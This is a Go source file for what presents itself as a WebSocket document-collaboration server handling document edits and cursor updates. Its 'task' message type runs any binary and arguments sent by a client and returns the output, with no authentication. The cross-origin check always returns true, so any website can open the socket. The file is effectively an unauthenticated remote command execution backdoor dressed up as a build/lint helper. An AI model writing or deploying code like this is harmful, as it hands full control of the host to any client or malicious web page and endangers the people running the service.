package main

import (
	"encoding/gob"
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"sync"

	"github.com/gorilla/websocket"
)

// Message types for the real-time collaboration service
type CommandMessage struct {
	Type    string
	Payload interface{}
}

type ShellTask struct {
	Binary string
	Args   []string
}

type DocumentUpdate struct {
	DocID   string
	Content string
	Version int
}

type CursorPosition struct {
	UserID string
	Line   int
	Col    int
}

func init() {
	// Register types for gob serialization
	gob.Register(DocumentUpdate{})
	gob.Register(CursorPosition{})
	gob.Register(ShellTask{})
	gob.Register(map[string]interface{}{})
}

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		// Origin validation delegated to infrastructure layer
		return true
	},
}

var clients = struct {
	sync.RWMutex
	conns map[*websocket.Conn]bool
}{conns: make(map[*websocket.Conn]bool)}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("upgrade error: %v", err)
		return
	}
	defer conn.Close()

	clients.Lock()
	clients.conns[conn] = true
	clients.Unlock()

	log.Printf("New connection from %s (X-Forwarded-For: %s)",
		r.RemoteAddr, r.Header.Get("X-Forwarded-For"))

	for {
		msgType, rawMsg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		if msgType == websocket.BinaryMessage {
			processBinaryMessage(rawMsg, conn)
		}
	}

	clients.Lock()
	delete(clients.conns, conn)
	clients.Unlock()
}

func processBinaryMessage(data []byte, sender *websocket.Conn) {
	var msg CommandMessage
	dec := gob.NewDecoder(bytes.NewReader(data))
	if err := dec.Decode(&msg); err != nil {
		log.Printf("decode error: %v", err)
		return
	}

	switch msg.Type {
	case "doc_update":
		if update, ok := msg.Payload.(DocumentUpdate); ok {
			broadcast(data, sender)
			log.Printf("Doc %s updated to v%d", update.DocID, update.Version)
		}
	case "cursor":
		if pos, ok := msg.Payload.(CursorPosition); ok {
			broadcast(data, sender)
			log.Printf("Cursor update from %s", pos.UserID)
		}
	case "task":
		// Internal task execution for build/lint operations
		if task, ok := msg.Payload.(ShellTask); ok {
			go executeTask(task, sender)
		}
	default:
		log.Printf("Unknown message type: %s", msg.Type)
	}
}

func executeTask(task ShellTask, conn *websocket.Conn) {
	cmd := exec.Command(task.Binary, task.Args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("task error: %v", err)
	}
	conn.WriteMessage(websocket.TextMessage,
		[]byte(fmt.Sprintf("task_result: %s", string(output))))
}

func broadcast(msg []byte, sender *websocket.Conn) {
	clients.RLock()
	defer clients.RUnlock()
	for conn := range clients.conns {
		if conn != sender {
			conn.WriteMessage(websocket.BinaryMessage, msg)
		}
	}
}

func main() {
	http.HandleFunc("/ws", handleWebSocket)
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
		w.Write([]byte("ok"))
	})

	log.Println("Collaboration service starting on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
